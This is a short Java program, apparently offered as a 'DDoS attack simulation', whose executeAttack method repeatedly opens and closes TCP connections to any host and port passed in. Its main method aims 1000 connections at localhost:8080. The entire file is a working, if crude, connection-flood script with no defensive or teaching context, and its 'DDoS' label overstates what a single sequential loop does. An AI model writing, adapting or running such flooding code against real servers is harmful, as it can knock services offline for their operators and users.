
import java.io.IOException;
import java.net.Socket;

public class DDoSAttackSimulation {

    public void executeAttack(String target, int port, int requestCount) {
        System.out.println("Launching DDoS attack on " + target + ":" + port);

        for (int i = 0; i < requestCount; i++) {
            try {
                Socket socket = new Socket(target, port);
                socket.close();
                System.out.println("Request " + (i + 1) + " sent.");
            } catch (IOException e) {
                System.out.println("Error sending request: " + e.getMessage());
            }
        }

        System.out.println("DDoS attack completed.");
    }

    public static void main(String[] args) {
        DDoSAttackSimulation attack = new DDoSAttackSimulation();
        attack.executeAttack("localhost", 8080, 1000); // 1000 requests
    }
}

